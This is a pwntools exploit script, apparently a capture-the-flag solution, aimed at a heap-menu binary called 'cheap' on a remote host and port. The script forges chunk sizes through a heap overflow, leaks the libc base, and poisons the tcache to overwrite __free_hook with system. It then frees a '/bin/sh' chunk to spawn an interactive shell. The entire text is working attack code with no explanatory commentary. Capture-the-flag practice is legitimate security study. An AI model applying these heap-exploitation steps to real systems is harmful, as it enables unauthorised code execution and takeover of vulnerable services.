from pwn import *
context.binary = elf = ELF('./cheap', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

s = remote('34.146.50.22', 30001)
#s = process('./cheap')

def create(size, data):
    s.sendlineafter(b'Choice: ', b'1')
    s.sendlineafter(b'size: ', str(size).encode())
    s.sendline(data)

def show():
    s.sendlineafter(b'Choice: ', b'2')
    return s.recvline()[:-1]

def delete():
    s.sendlineafter(b'Choice: ', b'3')

payload = b'A'*0x18+p64(0xd51)
create(0x10, payload)
create(0xd50, 'hoge')

create(0xd20, 'hoge')
delete()
libc.address = u64(show().ljust(8, b'\x00')) - 0x1ebb80 - 0x60
print('libc:', hex(libc.address))

create(0xd20, 'hoge')
create(0x10, 'hoge')
delete()
create(0x30, 'hoge')
delete()
create(0x40, 'hoge')
delete()

create(0x10, b'A'*0x18+p64(0x31))
delete()
create(0x30, b'A'*0x38+p64(0x31))
delete()
create(0x40, 'hoge')
delete()


payload = b'A'*0x58+p64(0x31)+p64(libc.symbols.__free_hook)
create(0x10, payload)
create(0x20, 'hoge')
create(0x20, p64(libc.symbols.system))
create(0x10, '/bin/sh')
delete()

s.interactive()
